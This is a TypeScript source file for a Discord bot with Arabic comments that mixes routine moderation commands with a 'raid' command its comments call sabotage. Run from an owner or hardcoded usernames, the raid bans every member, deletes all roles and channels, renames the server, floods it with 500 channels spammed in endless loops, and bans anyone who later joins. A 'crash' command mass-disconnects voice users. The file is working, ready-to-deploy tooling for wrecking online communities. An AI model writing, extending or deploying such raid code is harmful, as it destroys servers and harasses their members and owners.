import {
  Client,
  GatewayIntentBits,
  PermissionFlagsBits,
  ChannelType,
  type Message,
  type TextChannel,
  type GuildMember,
  Team,
} from "discord.js";
import { logger } from "./lib/logger";

const PING_INTERVAL_MS = 3 * 60 * 1000;
const PREFIX = "!";

// اليوزرات المسموح لهم باستخدام أوامر التخريب (غير الأونر)
const ALLOWED_USERNAMES = ["y.7tr2", "x8mk", "ehab08147"];

// ─── Self-ping ────────────────────────────────────────────────────────────────

function startSelfPing(url: string) {
  const ping = async () => {
    try {
      const res = await fetch(url);
      logger.info({ status: res.status }, "Self-ping sent");
    } catch (err) {
      logger.error({ err }, "Self-ping failed");
    }
  };
  void ping();
  setInterval(() => void ping(), PING_INTERVAL_MS);
}

// ─── Owner / allowed check ────────────────────────────────────────────────────

async function getOwnerId(client: Client): Promise<string | null> {
  try {
    const app = await client.application?.fetch();
    if (!app) return null;
    return app.owner instanceof Team ? app.owner.ownerId : (app.owner?.id ?? null);
  } catch {
    return null;
  }
}

function isAllowed(msg: Message, ownerId: string | null): boolean {
  if (ownerId && msg.author.id === ownerId) return true;
  // username بدون # (النظام الجديد من Discord)
  if (ALLOWED_USERNAMES.includes(msg.author.username)) return true;
  return false;
}

// ─── Spam helper — يسبام بلا توقف ────────────────────────────────────────────

async function spamChannel(ch: TextChannel, text: string) {
  while (true) {
    await Promise.all(
      Array.from({ length: 10 }, () => ch.send(text).catch(() => {})),
    );
  }
}

// ─── Ban helper — باند مع ريتراي ─────────────────────────────────────────────

async function banMember(m: GuildMember, executorId: string) {
  if (m.user.bot || m.id === executorId) return;
  for (let i = 0; i < 5; i++) {
    try {
      await m.ban({ reason: "raid", deleteMessageSeconds: 604800 });
      return;
    } catch {
      await new Promise((r) => setTimeout(r, 300));
    }
  }
}

// ─── Raid command ─────────────────────────────────────────────────────────────

async function doRaid(msg: Message, channelName: string, client: Client) {
  const guild = msg.guild;
  if (!guild) return;

  logger.info({ guild: guild.name, channelName }, "Raid started");

  // 1. طرد الكل من الفويس فوراً
  const voiceMembers = guild.members.cache.filter(
    (m) => m.voice.channelId !== null && !m.user.bot,
  );
  await Promise.all(
    voiceMembers.map((m) => m.voice.disconnect().catch(() => {})),
  );

  // 2. جلب كل الأعضاء وباندهم (مع ريتراي لكل واحد)
  const members = await guild.members.fetch().catch(() => guild.members.cache);
  await Promise.all(
    [...members.values()].map((m) => banMember(m as GuildMember, msg.author.id)),
  );

  // 3. باند أي عضو انضم أثناء التنفيذ (re-fetch)
  const members2 = await guild.members.fetch().catch(() => null);
  if (members2) {
    await Promise.all(
      [...members2.values()].map((m) =>
        banMember(m as GuildMember, msg.author.id),
      ),
    );
  }

  // 4. حذف كل الرتب
  await Promise.all(
    guild.roles.cache
      .filter((r) => !r.managed && r.id !== guild.id && r.editable)
      .map((r) => r.delete().catch(() => {})),
  );

  // 5. حذف كل الرومات (مرتين عشان ما يفوت شي)
  await Promise.all(
    guild.channels.cache.map((ch) => ch.delete().catch(() => {})),
  );
  await guild.channels.fetch().catch(() => {});
  await Promise.all(
    guild.channels.cache.map((ch) => ch.delete().catch(() => {})),
  );

  // 6. تغيير اسم السيرفر
  await guild.setName(channelName).catch(() => {});

  // 7. إنشاء أقصى عدد من الرومات (حد Discord = 500)
  const created: TextChannel[] = [];
  await Promise.all(
    Array.from({ length: 500 }, () =>
      guild.channels
        .create({ name: channelName, type: ChannelType.GuildText })
        .then((ch) => created.push(ch as TextChannel))
        .catch(() => {}),
    ),
  );

  logger.info({ created: created.length }, "Channels created — starting infinite spam");

  // 8. سبام بلا توقف في كل الرومات معاً
  void Promise.all(created.map((ch) => spamChannel(ch, channelName)));

  // 9. باند أي أحد يحاول ينضم بعدين
  client.on("guildMemberAdd", (m) => {
    if (m.guild.id === guild.id && !m.user.bot)
      m.ban({ reason: "raid" }).catch(() => {});
  });
}

// ─── Commands ─────────────────────────────────────────────────────────────────

async function handleCommand(
  msg: Message,
  ownerId: string | null,
  args: string[],
  cmd: string,
  client: Client,
) {
  if (!isAllowed(msg, ownerId)) return;

  const guild = msg.guild;
  if (!guild) return;

  const channel = msg.channel as TextChannel;

  // ── !raid <name> ───────────────────────────────────────────────────────
  if (cmd === "تهكير") {
    const name = args.join("-").toLowerCase().replace(/[^a-z0-9\u0600-\u06FF\-]/g, "") || "raided";
    await doRaid(msg, name, client);
  }

  // ── !nuke ──────────────────────────────────────────────────────────────
  else if (cmd === "nuke") {
    if (!channel.permissionsFor(guild.members.me!)?.has(PermissionFlagsBits.ManageChannels)) {
      await msg.reply("❌ ما عندي صلاحية ManageChannels").catch(() => {});
      return;
    }
    const pos = channel.position;
    const parent = channel.parentId;
    const name = channel.name;
    const topic = channel.topic ?? undefined;
    await channel.delete();
    const newCh = await guild.channels.create({
      name,
      type: ChannelType.GuildText,
      parent: parent ?? undefined,
      topic,
      position: pos,
    });
    await newCh.send("💥 تم النيوك").catch(() => {});
  }

  // ── !clear [amount] ────────────────────────────────────────────────────
  else if (cmd === "clear") {
    const amount = Math.min(parseInt(args[0] ?? "50") || 50, 100);
    await channel.bulkDelete(amount, true).catch(() => {});
  }

  // ── !kick @user ────────────────────────────────────────────────────────
  else if (cmd === "kick") {
    const target = msg.mentions.members?.first();
    if (!target) { await msg.reply("❌ حدد اليوزر").catch(() => {}); return; }
    await target.kick(args.slice(1).join(" ") || "بدون سبب").catch(() => {});
    await msg.react("✅").catch(() => {});
  }

  // ── !ban @user ─────────────────────────────────────────────────────────
  else if (cmd === "ban") {
    const target = msg.mentions.members?.first();
    if (!target) { await msg.reply("❌ حدد اليوزر").catch(() => {}); return; }
    await target.ban({ reason: args.slice(1).join(" ") || "بدون سبب", deleteMessageSeconds: 86400 }).catch(() => {});
    await msg.react("✅").catch(() => {});
  }

  // ── !mute @user [minutes] ─────────────────────────────────────────────
  else if (cmd === "mute") {
    const target = msg.mentions.members?.first() as GuildMember | undefined;
    if (!target) { await msg.reply("❌ حدد اليوزر").catch(() => {}); return; }
    const mins = parseInt(args[1] ?? "10") || 10;
    await target.timeout(mins * 60 * 1000).catch(() => {});
    await msg.react("✅").catch(() => {});
  }

  // ── !unmute @user ──────────────────────────────────────────────────────
  else if (cmd === "unmute") {
    const target = msg.mentions.members?.first() as GuildMember | undefined;
    if (!target) { await msg.reply("❌ حدد اليوزر").catch(() => {}); return; }
    await target.timeout(null).catch(() => {});
    await msg.react("✅").catch(() => {});
  }

  // ── !lock / !unlock ────────────────────────────────────────────────────
  else if (cmd === "lock") {
    await channel.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: false }).catch(() => {});
    await msg.react("🔒").catch(() => {});
  }
  else if (cmd === "unlock") {
    await channel.permissionOverwrites.edit(guild.roles.everyone, { SendMessages: null }).catch(() => {});
    await msg.react("🔓").catch(() => {});
  }

  // ── !slowmode [seconds] ────────────────────────────────────────────────
  else if (cmd === "slowmode") {
    const secs = Math.min(parseInt(args[0] ?? "5") || 5, 21600);
    await channel.setRateLimitPerUser(secs).catch(() => {});
    await msg.react("⏱️").catch(() => {});
  }

  // ── !crash (mass voice disconnect) ────────────────────────────────────
  else if (cmd === "crash") {
    const voiceMembers = guild.members.cache.filter((m) => m.voice.channelId !== null && !m.user.bot);
    await Promise.all(voiceMembers.map((m) => m.voice.disconnect().catch(() => {})));
    await msg.react("⚡").catch(() => {});
  }
}

// ─── Bot startup ──────────────────────────────────────────────────────────────

export function startBot() {
  const token = process.env["DISCORD_BOT_TOKEN"];
  if (!token) {
    logger.warn("DISCORD_BOT_TOKEN not set — bot will not start");
    return;
  }

  const renderUrl = process.env["RENDER_URL"];
  const pingTarget = renderUrl ? `${renderUrl.replace(/\/$/, "")}/api/healthz` : null;

  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMembers,
      GatewayIntentBits.GuildVoiceStates,
      GatewayIntentBits.GuildModeration,
    ],
  });

  let ownerId: string | null = null;

  client.once("clientReady", async (c) => {
    logger.info({ tag: c.user.tag }, "Discord bot is online");
    ownerId = await getOwnerId(client);
    logger.info({ ownerId }, "Owner ID loaded");
    if (pingTarget) {
      logger.info({ pingTarget, intervalMin: 3 }, "Starting self-ping");
      startSelfPing(pingTarget);
    }
  });

  client.on("messageCreate", async (msg) => {
    if (msg.author.bot || !msg.content.startsWith(PREFIX)) return;
    const [rawCmd, ...args] = msg.content.slice(PREFIX.length).trim().split(/\s+/);
    const cmd = rawCmd?.toLowerCase() ?? "";
    await handleCommand(msg, ownerId, args, cmd, client).catch((err) => {
      logger.error({ err, cmd }, "Command error");
    });
  });

  client.on("error", (err) => logger.error({ err }, "Discord client error"));

  client.login(token).catch((err) => logger.error({ err }, "Failed to login"));
}
